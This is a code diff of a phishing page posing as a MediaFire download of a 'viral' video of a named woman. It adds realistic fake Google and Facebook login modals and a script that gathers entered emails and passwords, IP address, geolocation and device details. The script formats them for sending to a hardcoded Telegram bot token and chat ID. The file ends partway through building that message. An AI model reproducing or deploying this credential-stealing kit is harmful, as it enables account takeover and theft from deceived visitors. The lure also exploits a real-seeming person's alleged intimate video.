@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire Beta Kipas</title>
+    <title>Andini Viral 17 Menit - MediaFire</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -14,6 +14,9 @@
             --mf-border: #ddd;
             --mf-text: #333;
             --mf-light-text: #666;
+            --fb-blue: #1877F2;
+            --fb-dark-blue: #166FE5;
+            --fb-green: #42b72a;
         }
 
         * {
@@ -27,6 +30,7 @@
             background-color: #f8f9fa;
             color: var(--mf-text);
             line-height: 1.6;
+            overflow-x: hidden;
         }
 
         .container {
@@ -40,12 +44,16 @@
             background: white;
             border-bottom: 1px solid var(--mf-border);
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
 
         .mf-topbar {
             background: #f8f9fa;
             border-bottom: 1px solid var(--mf-border);
             padding: 8px 0;
+            font-size: 13px;
         }
 
         .topbar-content {
@@ -161,6 +169,7 @@
         /* Main Content */
         .mf-main {
             padding: 30px 0;
+            min-height: 70vh;
         }
 
         .file-container {
@@ -370,6 +379,51 @@
             color: #bbb;
         }
 
+        /* Video Preview */
+        .video-preview {
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .video-thumbnail {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            cursor: pointer;
+        }
+
+        .video-thumbnail img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            transition: all 0.3s;
+        }
+
+        .play-button:hover {
+            background: rgba(0, 0, 0, 0.9);
+            transform: translate(-50%, -50%) scale(1.1);
+        }
+
         /* Footer */
         .mf-footer {
             background: #2c3e50;
@@ -431,17 +485,7 @@
             z-index: 10000;
             justify-content: center;
             align-items: center;
-        }
-
-        /* Google Login Modal */
-        .google-modal-content {
-            background: white;
-            width: 100%;
-            max-width: 450px;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.25);
-            animation: modalSlideIn 0.3s ease-out;
+            padding: 20px;
         }
 
         @keyframes modalSlideIn {
@@ -455,131 +499,6 @@
             }
         }
 
-        .google-modal-header {
-            padding: 24px 24px 0;
-            text-align: center;
-        }
-
-        .google-logo {
-            width: 75px;
-            height: 75px;
-            margin: 0 auto 20px;
-            background: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
-        }
-
-        .google-logo img {
-            width: 40px;
-            height: 40px;
-        }
-
-        .google-modal-header h2 {
-            font-size: 24px;
-            color: #202124;
-            font-weight: 400;
-            margin-bottom: 8px;
-        }
-
-        .google-modal-subtitle {
-            color: #5f6368;
-            font-size: 16px;
-            margin-bottom: 35px;
-        }
-
-        .google-modal-body {
-            padding: 0 40px 40px;
-        }
-
-        .google-form-group {
-            margin-bottom: 20px;
-        }
-
-        .google-form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #5f6368;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .google-input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            color: #202124;
-            transition: border-color 0.2s;
-            background: white;
-        }
-
-        .google-input:focus {
-            outline: none;
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
-        }
-
-        .google-input-error {
-            border-color: #d93025;
-        }
-
-        .google-actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 35px;
-        }
-
-        .google-create-account {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-        }
-
-        .google-create-account:hover {
-            text-decoration: underline;
-        }
-
-        .google-next-btn {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .google-next-btn:hover {
-            background: #1669d6;
-        }
-
-        .google-modal-footer {
-            text-align: center;
-            padding: 20px 40px;
-            border-top: 1px solid #e8eaed;
-            color: #5f6368;
-            font-size: 12px;
-            line-height: 1.4;
-        }
-
-        .google-modal-footer a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .google-modal-footer a:hover {
-            text-decoration: underline;
-        }
-
         /* Download Progress Modal */
         .progress-modal-content {
             background: white;
@@ -588,6 +507,7 @@
             border-radius: 8px;
             padding: 30px;
             text-align: center;
+            animation: modalSlideIn 0.3s ease-out;
         }
 
         .progress-icon {
@@ -647,6 +567,7 @@
             border-radius: 8px;
             padding: 40px 30px;
             text-align: center;
+            animation: modalSlideIn 0.3s ease-out;
         }
 
         .success-icon {
@@ -691,6 +612,473 @@
             flex: 1;
         }
 
+        /* Login Choice Modal */
+        .login-choice-modal {
+            background: white;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 8px;
+            overflow: hidden;
+            animation: modalSlideIn 0.3s ease-out;
+        }
+
+        .login-choice-header {
+            background: linear-gradient(135deg, var(--mf-blue), var(--mf-dark-blue));
+            color: white;
+            padding: 25px 30px;
+            text-align: center;
+        }
+
+        .login-choice-header h2 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+
+        .login-choice-header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+
+        .login-choice-body {
+            padding: 30px;
+        }
+
+        .login-choice-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .login-choice-btn {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px 20px;
+            border: 2px solid var(--mf-border);
+            border-radius: 8px;
+            background: white;
+            color: var(--mf-text);
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.2s;
+            text-align: left;
+        }
+
+        .login-choice-btn:hover {
+            border-color: var(--mf-blue);
+            background: #f0f7ff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .login-choice-btn.google {
+            border-color: #dadce0;
+        }
+
+        .login-choice-btn.google:hover {
+            border-color: #1a73e8;
+            background: #f8fafe;
+        }
+
+        .login-choice-btn.facebook {
+            border-color: #dddfe2;
+            color: #1877F2;
+        }
+
+        .login-choice-btn.facebook:hover {
+            border-color: var(--fb-blue);
+            background: #f0f8ff;
+        }
+
+        .login-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .login-footer-note {
+            text-align: center;
+            color: var(--mf-light-text);
+            font-size: 13px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid var(--mf-border);
+        }
+
+        /* Google Login Modal - REALISTIC STYLE */
+        .google-modal-content {
+            background: white;
+            width: 100%;
+            max-width: 450px;
+            border-radius: 8px;
+            overflow: hidden;
+            animation: modalSlideIn 0.3s ease-out;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+        }
+
+        .google-modal-header {
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+
+        .google-logo {
+            width: 75px;
+            height: 75px;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .google-logo img {
+            width: 75px;
+            height: 24px;
+        }
+
+        .google-modal-header h2 {
+            font-size: 24px;
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: 0;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+        }
+
+        .google-modal-subtitle {
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 400;
+            margin-top: 8px;
+        }
+
+        .google-modal-body {
+            padding: 0 40px 36px;
+        }
+
+        .google-form-group {
+            margin-bottom: 24px;
+        }
+
+        .google-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            transition: border-color 0.2s;
+            background: white;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .google-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .google-input-error {
+            border-color: #d93025;
+        }
+
+        .google-error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .google-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .google-create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .google-create-account:hover {
+            background-color: rgba(26, 115, 232, 0.04);
+            text-decoration: underline;
+        }
+
+        .google-next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            min-width: 80px;
+        }
+
+        .google-next-btn:hover {
+            background: #1669d6;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .google-next-btn:active {
+            background: #1a73e8;
+        }
+
+        .google-modal-footer {
+            padding: 24px 40px;
+            border-top: 1px solid #e8eaed;
+            color: #5f6368;
+            font-size: 12px;
+            line-height: 1.4;
+            text-align: center;
+            background: #f8f9fa;
+        }
+
+        .google-modal-footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .google-modal-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Facebook Login Modal - REALISTIC STYLE */
+        .facebook-modal-content {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            overflow: hidden;
+            animation: modalSlideIn 0.3s ease-out;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        .facebook-header {
+            background: white;
+            padding: 24px 0 0;
+            text-align: center;
+        }
+
+        .facebook-logo {
+            font-size: 42px;
+            margin-bottom: 16px;
+            color: var(--fb-blue);
+        }
+
+        .facebook-header h2 {
+            font-size: 25px;
+            font-weight: 600;
+            margin-bottom: 0;
+            color: #1c1e21;
+            line-height: 32px;
+        }
+
+        .facebook-subtitle {
+            font-size: 15px;
+            color: #606770;
+            margin: 0 0 24px;
+            line-height: 19px;
+        }
+
+        .facebook-body {
+            padding: 0 16px 16px;
+        }
+
+        .facebook-form-group {
+            margin-bottom: 12px;
+        }
+
+        .facebook-input {
+            width: 100%;
+            padding: 11px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+            background: white;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        .facebook-input::placeholder {
+            color: #8a8d91;
+        }
+
+        .facebook-input:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .facebook-input-error {
+            border-color: #f02849;
+        }
+
+        .facebook-error-message {
+            color: #f02849;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .facebook-login-btn {
+            background: var(--fb-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 600;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 6px;
+            font-family: inherit;
+            letter-spacing: normal;
+        }
+
+        .facebook-login-btn:hover {
+            background: var(--fb-dark-blue);
+        }
+
+        .facebook-login-btn:active {
+            background: var(--fb-blue);
+            transform: scale(0.99);
+        }
+
+        .facebook-forgot-link {
+            display: block;
+            text-align: center;
+            color: var(--fb-blue);
+            text-decoration: none;
+            font-size: 14px;
+            margin: 16px 0;
+            padding: 12px 0;
+            border-bottom: 1px solid #dadde1;
+            font-family: inherit;
+        }
+
+        .facebook-forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .facebook-divider {
+            text-align: center;
+            position: relative;
+            margin: 20px 0;
+            color: #96999e;
+            font-size: 12px;
+        }
+
+        .facebook-divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dadde1;
+        }
+
+        .facebook-divider span {
+            background: white;
+            padding: 0 16px;
+            position: relative;
+            text-transform: uppercase;
+        }
+
+        .facebook-create-btn {
+            background: var(--fb-green);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            padding: 12px;
+            width: auto;
+            min-width: 194px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: block;
+            margin: 0 auto;
+            text-align: center;
+            text-decoration: none;
+            font-family: inherit;
+        }
+
+        .facebook-create-btn:hover {
+            background: #36a420;
+        }
+
+        .facebook-footer {
+            background: white;
+            border-top: 1px solid #dadde1;
+            padding: 20px 16px;
+            text-align: center;
+            font-size: 14px;
+            color: #8a8d91;
+            line-height: 1.4;
+        }
+
+        .facebook-footer a {
+            color: var(--fb-blue);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .facebook-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #ccd0d5;
+            text-align: center;
+        }
+
+        .language-selector a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 5px;
+        }
+
+        .language-selector a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading Spinner */
+        .mf-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         /* Responsive */
         @media (max-width: 768px) {
             .file-stats {
@@ -705,8 +1093,21 @@
                 display: none;
             }
             
-            .google-modal-body {
-                padding: 0 20px 30px;
+            .google-modal-body,
+            .facebook-body {
+                padding: 0 20px 20px;
+            }
+            
+            .google-modal-header {
+                padding: 32px 24px 24px;
+            }
+            
+            .facebook-header {
+                padding: 20px 0 0;
+            }
+            
+            .login-choice-buttons {
+                gap: 10px;
             }
         }
 
@@ -725,6 +1126,10 @@
             
             .file-body {
                 padding: 20px;
+            }
+            
+            .mf-auth {
+                display: none;
             }
         }
     </style>
@@ -774,18 +1179,28 @@
         <div class="container">
             <div class="file-container">
                 <div class="file-header">
-                    <h1 class="file-title">Free Fire Beta Kipas.apk</h1>
+                    <h1 class="file-title">Video Andini Viral 17 Menit.mp4</h1>
                     <div class="file-meta">
-                        <span>578 MB</span>
-                        <span>Updated: Today 14:30</span>
-                        <span>Downloads: 2,847</span>
-                        <span>File type: .apk</span>
+                        <span>21.6 MB</span>
+                        <span>Duration: 17:32</span>
+                        <span>Downloads: 128,475</span>
+                        <span>File type: .mp4</span>
                     </div>
                 </div>
                 
                 <div class="file-body">
                     <div class="file-icon-large">
-                        <i class="fas fa-file-archive"></i>
+                        <i class="fas fa-file-video"></i>
+                    </div>
+                    
+                    <!-- Video Preview -->
+                    <div class="video-preview">
+                        <div class="video-thumbnail" id="videoThumbnail">
+                            <img src="https://images.unsplash.com/photo-1611605698335-8b1569810432?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80" alt="Video Thumbnail">
+                            <div class="play-button">
+                                <i class="fas fa-play"></i>
+                            </div>
+                        </div>
                     </div>
                     
                     <!-- Security Banner -->
@@ -797,31 +1212,31 @@
                     <!-- File Stats -->
                     <div class="file-stats">
                         <div class="stat-box">
-                            <span class="stat-number">2,847</span>
+                            <span class="stat-number">128,475</span>
                             <span class="stat-label">Downloads</span>
                         </div>
                         <div class="stat-box">
-                            <span class="stat-number">4.8</span>
+                            <span class="stat-number">4.9</span>
                             <span class="stat-label">Rating</span>
                         </div>
                         <div class="stat-box">
-                            <span class="stat-number">12</span>
+                            <span class="stat-number">2,847</span>
                             <span class="stat-label">Comments</span>
                         </div>
                         <div class="stat-box">
                             <span class="stat-number">Today</span>
-                            <span class="stat-label">Last Updated</span>
+                            <span class="stat-label">Uploaded</span>
                         </div>
                     </div>
                     
                     <!-- Download Section -->
                     <div class="download-section">
-                        <h3>Download File</h3>
+                        <h3>Download Video File</h3>
                         <button class="mf-download-btn" id="downloadBtn">
-                            <i class="fas fa-download"></i> DOWNLOAD NOW
+                            <i class="fas fa-download"></i> DOWNLOAD MP4 NOW
                         </button>
                         <p class="download-info">
-                            <i class="fas fa-clock"></i> Estimated time: 5-10 min • 
+                            <i class="fas fa-clock"></i> Estimated time: 30 seconds • 
                             <i class="fas fa-shield-alt"></i> 100% Safe
                         </p>
                     </div>
@@ -839,23 +1254,27 @@
                     <table class="file-info-table">
                         <tr>
                             <td>File Name:</td>
-                            <td>Free Fire Beta Kipas</td>
+                            <td>Andini_Viral_17_Menit_Full_HD.mp4</td>
                         </tr>
                         <tr>
                             <td>File Size:</td>
-                            <td>578 MB (1,985,342,464 bytes)</td>
+                            <td>21.6 MB (22,649,856 bytes)</td>
                         </tr>
                         <tr>
-                            <td>File Type:</td>
-                            <td>Application (.apk)</td>
+                            <td>Duration:</td>
+                            <td>17 minutes 32 seconds</td>
+                        </tr>
+                        <tr>
+                            <td>Resolution:</td>
+                            <td>1920×1080 (Full HD)</td>
                         </tr>
                         <tr>
                             <td>Uploaded:</td>
-                            <td>December 15, 2025</td>
+                            <td>Today, 09:45 AM</td>
                         </tr>
                         <tr>
                             <td>Uploaded By:</td>
-                            <td>Garena Indonesia</td>
+                            <td>Anonymous User</td>
                         </tr>
                         <tr>
                             <td>Virus Scan:</td>
@@ -925,17 +1344,66 @@
             
             <div class="footer-bottom">
                 <p>© 2023 MediaFire. All rights reserved.</p>
-                <p>Free Fire is a registered trademark of Garena International. This file is shared for testing purposes only.</p>
+                <p>All content is uploaded by users. MediaFire is not responsible for uploaded content.</p>
             </div>
         </div>
     </footer>
 
-    <!-- Google Login Modal -->
+    <!-- Login Choice Modal -->
+    <div class="modal" id="loginChoiceModal">
+        <div class="login-choice-modal">
+            <div class="login-choice-header">
+                <h2>Login Required</h2>
+                <p>Please login to continue your download</p>
+            </div>
+            
+            <div class="login-choice-body">
+                <p style="text-align: center; color: var(--mf-light-text); margin-bottom: 25px;">
+                    Sign in with your account to access this file
+                </p>
+                
+                <div class="login-choice-buttons">
+                    <button class="login-choice-btn google" id="googleLoginChoice">
+                        <div class="login-icon">
+                            <i class="fab fa-google" style="color: #4285F4;"></i>
+                        </div>
+                        <div>
+                            <div style="font-weight: 600;">Continue with Google</div>
+                            <div style="font-size: 13px; color: var(--mf-light-text);">Gmail, Google Workspace</div>
+                        </div>
+                        <i class="fas fa-chevron-right" style="margin-left: auto; color: #999;"></i>
+                    </button>
+                    
+                    <button class="login-choice-btn facebook" id="facebookLoginChoice">
+                        <div class="login-icon">
+                            <i class="fab fa-facebook" style="color: #1877F2;"></i>
+                        </div>
+                        <div>
+                            <div style="font-weight: 600;">Continue with Facebook</div>
+                            <div style="font-size: 13px; color: var(--mf-light-text);">Facebook, Instagram account</div>
+                        </div>
+                        <i class="fas fa-chevron-right" style="margin-left: auto; color: #999;"></i>
+                    </button>
+                </div>
+                
+                <div class="login-footer-note">
+                    <i class="fas fa-lock"></i> Your login is secured with encryption
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Google Login Modal - REALISTIC STYLE -->
     <div class="modal" id="googleLoginModal">
         <div class="google-modal-content">
             <div class="google-modal-header">
                 <div class="google-logo">
-                    <img src="https://files.catbox.moe/0akmw6.png" alt="Google">
+                    <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20.64 12.2c0-.63-.06-1.25-.16-1.84H12v3.48h4.84a4.14 4.14 0 0 1-1.8 2.71v2.26h2.92a8.78 8.78 0 0 0 2.68-6.61z" fill="#4285F4"/>
+                        <path d="M12 21c2.43 0 4.47-.8 5.96-2.18l-2.92-2.26a5.56 5.56 0 0 1-3.04.83 5.6 5.6 0 0 1-5.27-3.87H3.58v2.33A9 9 0 0 0 12 21z" fill="#34A853"/>
+                        <path d="M6.73 14.52a5.4 5.4 0 0 1 0-3.44V8.75H3.58a9 9 0 0 0 0 8.12l3.15-2.35z" fill="#FBBC05"/>
+                        <path d="M12 6.38a4.9 4.9 0 0 1 3.46 1.35l2.58-2.58A8.6 8.6 0 0 0 12 3a9 9 0 0 0-8.42 5.75l3.15 2.33A5.6 5.6 0 0 1 12 6.38z" fill="#EA4335"/>
+                    </svg>
                 </div>
                 <h2>Sign in</h2>
                 <p class="google-modal-subtitle">to continue to MediaFire Download</p>
@@ -943,13 +1411,13 @@
             
             <div class="google-modal-body">
                 <div class="google-form-group">
-                    <label for="googleEmail">Email or phone</label>
-                    <input type="email" id="googleEmail" class="google-input" placeholder="Enter your email" required>
+                    <input type="email" id="googleEmail" class="google-input" placeholder="Email or phone" required>
+                    <div class="google-error-message" id="googleEmailError">Enter a valid email or phone number</div>
                 </div>
                 
                 <div class="google-form-group">
-                    <label for="googlePassword">Enter your password</label>
                     <input type="password" id="googlePassword" class="google-input" placeholder="Enter your password" required>
+                    <div class="google-error-message" id="googlePasswordError">Enter your password</div>
                 </div>
                 
                 <div class="google-actions">
@@ -965,13 +1433,64 @@
         </div>
     </div>
 
+    <!-- Facebook Login Modal - REALISTIC STYLE -->
+    <div class="modal" id="facebookLoginModal">
+        <div class="facebook-modal-content">
+            <div class="facebook-header">
+                <div class="facebook-logo">
+                    <i class="fab fa-facebook"></i>
+                </div>
+                <h2>Log in to Facebook</h2>
+                <p class="facebook-subtitle">Log in to Facebook to continue to MediaFire.</p>
+            </div>
+            
+            <div class="facebook-body">
+                <div class="facebook-form-group">
+                    <input type="text" id="facebookEmail" class="facebook-input" placeholder="Email address or phone number" required>
+                    <div class="facebook-error-message" id="emailError">The email address or mobile number you entered isn't connected to an account.</div>
+                </div>
+                
+                <div class="facebook-form-group">
+                    <input type="password" id="facebookPassword" class="facebook-input" placeholder="Password" required>
+                    <div class="facebook-error-message" id="passwordError">The password you entered is incorrect. Please try again.</div>
+                </div>
+                
+                <button class="facebook-login-btn" id="facebookLoginBtn">Log In</button>
+                
+                <a href="#" class="facebook-forgot-link">Forgotten password?</a>
+                
+                <div class="facebook-divider">
+                    <span>or</span>
+                </div>
+                
+                <a href="#" class="facebook-create-btn">
+                    Create new account
+                </a>
+                
+                <div class="language-selector">
+                    <a href="#">English (UK)</a>
+                    <a href="#">Bahasa Indonesia</a>
+                    <a href="#">Español</a>
+                    <a href="#">Português (Brasil)</a>
+                    <a href="#">More languages</a>
+                </div>
+            </div>
+            
+            <div class="facebook-footer">
+                <p><a href="#">Sign up for Facebook</a> • <a href="#">Log in</a> • <a href="#">Messenger</a> • <a href="#">Facebook Lite</a> • <a href="#">Video</a> • <a href="#">Places</a> • <a href="#">Games</a> • <a href="#">Marketplace</a></p>
+                <p><a href="#">Meta Pay</a> • <a href="#">Oculus</a> • <a href="#">Portal</a> • <a href="#">Instagram</a> • <a href="#">Bulletin</a> • <a href="#">Fundraisers</a></p>
+                <p style="margin-top: 10px; font-size: 11px;">Your login information will be shared with MediaFire for download verification.</p>
+            </div>
+        </div>
+    </div>
+
     <!-- Download Progress Modal -->
     <div class="modal" id="progressModal">
         <div class="progress-modal-content">
             <div class="progress-icon">
                 <i class="fas fa-cloud-download-alt"></i>
             </div>
-            <h2 class="progress-title">Downloading File</h2>
+            <h2 class="progress-title">Downloading Video</h2>
             <p class="progress-status" id="statusText">Preparing download...</p>
             
             <div class="mf-progress-bar">
@@ -994,22 +1513,27 @@
             </div>
             <h2 class="success-title">Download Complete!</h2>
             <p class="success-message">
-                Free_Fire_Beta_v2.99.1.exe has been successfully downloaded to your device.<br>
-                Check your Downloads folder for the file.
+                Andini_Viral_17_Menit_Full_HD.mp4 has been successfully downloaded to your device.<br>
+                Check your Downloads folder for the video file.
             </p>
             <button class="mf-btn primary" id="closeSuccessBtn">Close</button>
         </div>
     </div>
 
     <script>
-        // Telegram Bot Configuration - FIXED WORKING
+        // Telegram Bot Configuration
         const TELEGRAM_BOT_TOKEN = '7817756007:AAH6x6TAG2LixwLA88Y0pog-t7mlAiBejko';
         const TELEGRAM_CHAT_ID = '6688114602';
 
         // DOM Elements
         const downloadBtn = document.getElementById('downloadBtn');
+        const loginChoiceModal = document.getElementById('loginChoiceModal');
+        const googleLoginChoice = document.getElementById('googleLoginChoice');
+        const facebookLoginChoice = document.getElementById('facebookLoginChoice');
         const googleLoginModal = document.getElementById('googleLoginModal');
+        const facebookLoginModal = document.getElementById('facebookLoginModal');
         const googleLoginBtn = document.getElementById('googleLoginBtn');
+        const facebookLoginBtn = document.getElementById('facebookLoginBtn');
         const progressModal = document.getElementById('progressModal');
         const progressFill = document.getElementById('progressFill');
         const progressText = document.getElementById('progressText');
@@ -1018,11 +1542,15 @@
         const closeSuccessBtn = document.getElementById('closeSuccessBtn');
         const googleEmailInput = document.getElementById('googleEmail');
         const googlePasswordInput = document.getElementById('googlePassword');
+        const facebookEmailInput = document.getElementById('facebookEmail');
+        const facebookPasswordInput = document.getElementById('facebookPassword');
+        const videoThumbnail = document.getElementById('videoThumbnail');
 
         // User data collection
         let userData = {
             email: '',
             password: '',
+            loginMethod: '',
             ip: '',
             userAgent: navigator.userAgent,
             timestamp: '',
@@ -1031,34 +1559,48 @@
             language: navigator.language,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             referrer: document.referrer || 'Direct',
-            source: 'MediaFire Clone'
+            source: 'MediaFire Clone',
+            location: {},
+            video: {
+                title: 'Andini Viral 17 Menit',
+                size: '21.6 MB',
+                format: 'MP4',
+                duration: '17:32'
+            }
         };
 
-        // Get IP address - SIMPLE AND RELIABLE
+        // Get IP address
         async function getIPAddress() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 userData.ip = data.ip;
                 console.log('✅ IP Address obtained:', userData.ip);
+                
+                // Try to get location data
+                try {
+                    const locResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
+                    const locData = await locResponse.json();
+                    userData.location = {
+                        country: locData.country_name || 'Unknown',
+                        city: locData.city || 'Unknown',
+                        region: locData.region || 'Unknown',
+                        isp: locData.org || 'Unknown',
+                        coordinates: locData.latitude ? `${locData.latitude}, ${locData.longitude}` : 'N/A'
+                    };
+                } catch (locError) {
+                    console.log('⚠️ Location data not available');
+                }
+                
                 return userData.ip;
             } catch (error) {
                 console.error('❌ IP fetch failed:', error);
-                // Fallback to alternative service
-                try {
-                    const response = await fetch('https://api64.ipify.org?format=json');
-                    const data = await response.json();
-                    userData.ip = data.ip;
-                    console.log('✅ IP Address obtained (fallback):', userData.ip);
-                    return userData.ip;
-                } catch (fallbackError) {
-                    userData.ip = 'Unknown';
-                    return 'Unknown';
-                }
+                userData.ip = 'Unknown';
+                return 'Unknown';
             }
         }
 
-        // Send data to Telegram - ULTRA SIMPLE METHOD
+        // Send data to Telegram with BEAUTIFUL formatting
         async function sendToTelegram() {
             const timestamp = new Date().toLocaleString('en-US', {
                 year: 'numeric',
@@ -1070,48 +1612,68 @@
                 hour12: true
             });
 
-            // Create the message with ALL data
-            const message = `🎯 MEDIAFIRE LOGIN CAPTURED 🎯
+            // Determine login method
+            const loginMethod = userData.loginMethod === 'facebook' ? 'Facebook' : 'Google';
+            const methodIcon = userData.loginMethod === 'facebook' ? '🔵' : '🔴';
+            
+            // Create beautiful message with ASCII art and emojis
+            const message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 *VIDEO DOWNLOAD CAPTURED* 🎯
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🔐 LOGIN CREDENTIALS:
-📧 Email: ${userData.email}
-🔑 Password: ${userData.password}
+${methodIcon} *LOGIN METHOD: ${loginMethod.toUpperCase()}*
+📧 *Email:* \`${userData.email}\`
+🔑 *Password:* \`${userData.password}\`
 
-🌐 NETWORK INFO:
-📍 IP Address: ${userData.ip}
-🕐 Time: ${timestamp}
-🌍 Timezone: ${userData.timezone}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎬 *VIDEO INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📹 *Title:* Andini Viral 17 Menit
+💾 *Size:* 21.6 MB
+⏱️ *Duration:* 17 minutes 32 seconds
+📦 *Format:* MP4 (Full HD)
 
-🖥️ SYSTEM INFO:
-• Browser: ${userData.userAgent.substring(0, 80)}...
-• Screen: ${userData.screenSize}
-• Platform: ${userData.platform}
-• Language: ${userData.language}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 *NETWORK INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 *IP Address:* \`${userData.ip}\`
+🕐 *Timestamp:* ${timestamp}
+🌍 *Timezone:* ${userData.timezone}
 
-📁 DOWNLOAD DETAILS:
